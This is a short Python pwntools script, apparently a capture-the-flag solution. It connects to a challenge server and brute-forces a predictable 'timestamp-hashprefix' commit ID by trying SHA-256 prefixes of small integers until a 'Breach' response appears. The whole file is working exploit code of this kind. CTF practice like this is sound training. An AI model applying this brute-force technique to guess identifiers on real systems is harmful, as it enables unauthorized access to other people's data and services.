from pwn import *
import hashlib
import time
import sys

context.log_level='debug'
# Precompute hash_prefixes
hash_map = {}
for i in range(1, 10001):
    h = hashlib.sha256(str(i).encode()).hexdigest()[:6]
    hash_map[h] = i

PORT = 1340

io = remote('challs.breachers.in', 1340)

# Wait for prompt, send git commit
commit_time = str(int(time.time()))  # Estimate commit time
io.sendlineafter("$", "git commit")
# Capture the commit timestamp
io.recvuntil("Committed.")
commit_time_after = str(int(time.time()))

# This is to ensure that the `time.time()` records the correct time.
# You can also brute-force all the timestamps between `commit_time` and `commit_time_after`.
if commit_time != commit_time_after:
	sys.exit()

# Brute-force the commit hash
log.info(f"Brute-forcing commit ID for timestamp: {commit_time}")

for hash_prefix, rand_val in hash_map.items():
    commit_id = f"{commit_time}-{hash_prefix}"
    io.sendline(f"git snapshot {commit_id}")
    response = io.recvline(timeout=1)

    if b"Breach" in response:  # Adjust this check based on expected output
        log.success(f"Found valid commit ID: {commit_id}")
        break

# Keep the interactive session open
io.interactive()
